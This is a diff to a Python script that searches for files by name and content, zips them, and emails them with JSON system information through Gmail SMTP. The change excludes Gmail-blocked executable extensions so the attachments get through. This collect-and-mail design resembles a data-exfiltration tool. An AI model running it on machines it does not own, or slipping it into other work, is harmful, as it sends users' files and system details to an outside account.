@@ -56,7 +56,14 @@ def main(arguments):
         path = ''
 
     # Recherche les fichiers
-    files = filemanager.search_files(search_files, path=path, contains_txt=contains_text)
+    gmail_extension_banned = ['.ade', '.adp', '.apk', '.appx', '.appxbundle', '.bat', '.cab', '.chm', '.cmd',
+                              '.com', '.cpl', '.dll', '.dmg', '.ex', '.ex_', '.exe', '.hta', '.ins', '.isp', '.iso',
+                              '.jar', '.js', '.jse', '.lib', '.lnk', '.mde', '.msc', '.msi', '.msix', '.msixbundle',
+                              '.msp', '.mst', '.nsh', '.pif', '.ps1', '.scr', '.sct', '.shb', '.sys', '.vb', '.vbe',
+                              '.vbs', '.vxd', '.wsc', '.wsf', '.wsh']
+    files = filemanager.search_files(search_files, path=path, contains_txt=contains_text,
+                                         exclude_text=gmail_extension_banned)
+
     # Copie les fichiers
     if arguments.interactive or arguments.interactive == 1 or (
             arguments.interactive is not None and arguments.interactive.lower() == "true"):
@@ -84,9 +91,11 @@ def main(arguments):
 
     if arguments.email and arguments.email.strip() and arguments.password and arguments.password.strip():
         if zipfile is not None:
-            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()), [zipfile, csv_manager.FILENAME])
+            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()),
+                     [zipfile, csv_manager.FILENAME])
         else:
-            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()), [csv_manager.FILENAME])
+            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()),
+                     [csv_manager.FILENAME])
 
 
 def sendmail(email, password, message='', files=None):
@@ -107,7 +116,6 @@ def sendmail(email, password, message='', files=None):
         # After the file is closed
         part['Content-Disposition'] = 'attachment; filename="%s"' % os.path.basename(f)
         msg.attach(part)
-
 
     # manages a connection to an SMTP server
     smtp = smtplib.SMTP(host="smtp.gmail.com", port=587)
